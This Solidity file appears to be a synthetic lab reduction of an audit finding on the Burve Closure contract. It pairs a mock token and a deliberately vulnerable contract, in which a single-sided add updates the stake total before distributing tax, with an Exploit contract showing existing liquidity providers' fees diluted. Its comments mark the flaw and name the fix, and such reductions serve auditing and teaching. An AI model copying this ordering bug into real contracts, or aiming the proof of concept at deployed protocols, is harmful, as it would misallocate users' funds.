// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Burve Closure — Incorrect tax distribution on single-sided add
    (Sherlock 2025-04-burve; #56953)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: Closure.addValueSingle() updates self.valueStaked BEFORE
    addEarnings() distributes the tax. Earnings index is then:
        earningsPerValueX128 += (tax << 128) / valueStaked
    with the NEW staker already in the denominator, so existing LPs are
    diluted and the new LP (who paid the tax) captures part of it. Excess
    fee share is stuck / misallocated.

    Finding quote (addEarnings):
        self.earningsPerValueX128[idx] +=
            (reserveShares << 128) / (self.valueStaked - self.bgtValueStaked);

    FIX: distribute tax against previous valueStaked (before the increment).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "TKN";
    string public symbol = "TKN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Closure with single-sided tax + broken earnings distribution order.
contract Closure {
    MockERC20 public token;
    uint256 public valueStaked;
    uint256 public earningsPerValueX128; // global index
    uint256 public taxBps; // e.g. 100 = 1%
    uint256 public taxHeld; // tax tokens sitting in the contract

    mapping(address => uint256) public valueOf;
    mapping(address => uint256) public earningsIndexOf; // snapshot of index at last update
    mapping(address => uint256) public accrued; // realized earnings tokens

    constructor(MockERC20 t, uint256 bps) {
        token = t;
        taxBps = bps;
    }

    /// @dev Bootstrap dead/seed value (no tax).
    function seed(address recipient, uint256 value) external {
        token.transferFrom(msg.sender, address(this), value);
        _harvest(recipient);
        valueOf[recipient] += value;
        valueStaked += value;
    }

    /// @dev Proportional (multi-sided) add — no tax, for Alice baseline.
    function addValue(address recipient, uint256 value) external {
        token.transferFrom(msg.sender, address(this), value);
        _harvest(recipient);
        valueOf[recipient] += value;
        valueStaked += value;
    }

    /// @dev Single-sided add: charges tax, but updates valueStaked BEFORE addEarnings.
    function addValueSingle(address recipient, uint256 value) external returns (uint256 tax) {
        tax = (value * taxBps) / 10_000;
        uint256 required = value + tax;
        token.transferFrom(msg.sender, address(this), required);

        _harvest(recipient);

        // --- order matches the bug: stake first, then distribute tax ---
        valueOf[recipient] += value;
        valueStaked += value; // @> VULN: valueStaked updated BEFORE tax distribution
        // FIX: addEarnings(tax) first using previous valueStaked, THEN valueStaked += value

        _addEarnings(tax); // dilutes because new staker is already in denominator
        taxHeld += tax;
    }

    /// @dev Mirrors Closure.addEarnings denominator bug (bgtValueStaked = 0 here).
    function _addEarnings(uint256 tax) internal {
        if (valueStaked == 0 || tax == 0) return;
        // Finding: earningsPerValueX128 += (reserveShares << 128) / (valueStaked - bgtValueStaked)
        earningsPerValueX128 += (tax << 128) / valueStaked; // @> VULN: includes new LP in denom
    }

    function _harvest(address user) internal {
        uint256 v = valueOf[user];
        if (v == 0) {
            earningsIndexOf[user] = earningsPerValueX128;
            return;
        }
        uint256 delta = earningsPerValueX128 - earningsIndexOf[user];
        uint256 earned = (v * delta) >> 128;
        accrued[user] += earned;
        earningsIndexOf[user] = earningsPerValueX128;
    }

    function collectEarnings(address user) external returns (uint256 amount) {
        _harvest(user);
        amount = accrued[user];
        accrued[user] = 0;
        // Pay from taxHeld (fees reserved for LPs)
        if (amount > taxHeld) amount = taxHeld;
        taxHeld -= amount;
        token.transfer(user, amount);
    }

    function pendingEarnings(address user) external view returns (uint256) {
        uint256 v = valueOf[user];
        uint256 delta = earningsPerValueX128 - earningsIndexOf[user];
        return accrued[user] + ((v * delta) >> 128);
    }
}

contract LP {
    Closure public c;
    MockERC20 public token;

    constructor(Closure c_) {
        c = c_;
        token = c_.token();
    }

    function seed(uint256 v) external {
        token.approve(address(c), v);
        c.seed(address(this), v);
    }

    function add(uint256 v) external {
        token.approve(address(c), v);
        c.addValue(address(this), v);
    }

    function addSingle(uint256 v) external returns (uint256 tax) {
        uint256 taxEst = (v * c.taxBps()) / 10_000;
        token.approve(address(c), v + taxEst);
        tax = c.addValueSingle(address(this), v);
    }

    function collect() external returns (uint256) {
        return c.collectEarnings(address(this));
    }
}

/// @dev Alice is sole LP; Bob single-sides in; Alice should get ~all tax but is diluted.
contract Exploit {
    MockERC20 public token; // CREATE 1
    Closure public closure; // CREATE 2 — vulnerable
    LP public alice; // CREATE 3
    LP public bob; // CREATE 4

    uint256 public constant SEED = 100 ether;
    uint256 public constant ALICE_VAL = 100 ether;
    uint256 public constant BOB_VAL = 500 ether; // 5× as in finding PoC
    uint256 public constant TAX_BPS = 100; // 1%

    uint256 public taxPaid;
    uint256 public aliceGot;
    uint256 public bobGot;
    uint256 public dilutedAway; // tax Alice should have gotten but didn't

    constructor() {
        token = new MockERC20();
        closure = new Closure(token, TAX_BPS);
        alice = new LP(closure);
        bob = new LP(closure);
    }

    function run() external {
        // Initial value (dead/seed) + Alice as only real LP — finding textual PoC.
        token.mint(address(alice), SEED + ALICE_VAL);
        alice.seed(SEED);
        alice.add(ALICE_VAL);
        // valueStaked = 200e18, all attributable to alice (seed+add)
        require(closure.valueStaked() == SEED + ALICE_VAL, "staked");
        require(closure.pendingEarnings(address(alice)) == 0, "no earn yet");

        // Bob single-sided add: pays 1% tax on 500e18 = 5e18. Tax should go to Alice
        // (and seed share). Bug: valueStaked updated first → Bob included in denom.
        taxPaid = (BOB_VAL * TAX_BPS) / 10_000; // 5e18
        token.mint(address(bob), BOB_VAL + taxPaid);
        bob.addSingle(BOB_VAL);
        require(closure.valueStaked() == SEED + ALICE_VAL + BOB_VAL, "after bob");

        // Alice's fair share of tax: aliceValue / previousStaked * tax
        // previousStaked = 200e18, alice = 200e18 → fair ≈ 5e18 (100%)
        // Bug index uses new staked 700e18 → alice gets 200/700 * 5e18 ≈ 1.428e18
        aliceGot = closure.pendingEarnings(address(alice));
        bobGot = closure.pendingEarnings(address(bob));

        // Bob just entered: harvest on addValueSingle zeroed him at post-update index,
        // so bob's pending from this tax should be 0 IF harvest-before-stake were correct.
        // With bug, index is set after stake update + earnings update, and bob was
        // harvested before stake — so bob's index is pre-earnings, and bob NOW has value,
        // so bob accrues (bobVal * delta) on next harvest... actually:
        // addValueSingle: _harvest(bob) at index OLD; valueOf+=; valueStaked+=; _addEarnings;
        // bob's earningsIndexOf is still OLD, so pending = bobVal * (newIndex-oldIndex).
        // Yes — Bob captures a share of his own tax. That's the dilution.

        require(bobGot > 0, "bob wrongly accrued own tax share");
        require(aliceGot < taxPaid, "alice should be diluted below full tax");
        // Fair alice share of tax (alice holds all prior stake): taxPaid
        // Actual: aliceGot ≈ tax * 200/700
        uint256 fairAlice = taxPaid; // she held 100% of prior stake
        dilutedAway = fairAlice - aliceGot;
        require(dilutedAway > 0, "no dilution");

        // Collect to surface token movement (Alice gets less than taxPaid)
        uint256 collected = alice.collect();
        require(collected == aliceGot, "collect matches");
        // HARM: dilution of existing LP tax; bob captured part of tax he paid;
        // remaining taxHeld may also be stuck relative to fair distribution.
        require(token.balanceOf(address(alice)) == collected, "alice paid");
        require(dilutedAway >= taxPaid / 2, "material dilution"); // ~3.57 of 5
    }
}
